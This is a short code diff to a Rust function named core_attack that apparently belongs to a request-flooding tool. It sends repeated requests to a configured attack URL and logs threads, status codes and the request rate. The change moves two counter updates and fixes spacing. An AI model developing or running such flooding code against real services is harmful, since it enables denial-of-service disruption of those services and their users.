@@ -28,8 +28,10 @@ fn core_attack() {
                     let error_data = extra_fn::request(&UNSAFE_PUB_VAR.attack_url);
                     match error_data.await {
                         Ok(status_code) => {
+                            UNSAFE_PUB_VAR.amount_sent += 1.0;
+                            UNSAFE_PUB_VAR.threads_on -= 1.0;
                             if now.elapsed().as_secs() > 40 {
-                                let wait=   subtract();
+                                let wait = subtract();
                                 println!(
                                     "Threads on {},\n Status code {},\n Request sent per 10 mil {}\n Time Elapsed {}",
                                     UNSAFE_PUB_VAR.threads_on,
@@ -37,7 +39,6 @@ fn core_attack() {
                                     UNSAFE_PUB_VAR.amount_sent,
                                     now.elapsed().as_secs()
                                 );
-                                UNSAFE_PUB_VAR.amount_sent += 1.0;
                                 wait.await;
                             } else {
                                 let wait = add();
@@ -50,7 +51,6 @@ fn core_attack() {
                                 );
                                 wait.await;
                             }
-                            UNSAFE_PUB_VAR.threads_on -= 1.0;
                         }
                         Err(data) => {
                             let wait = subtract();
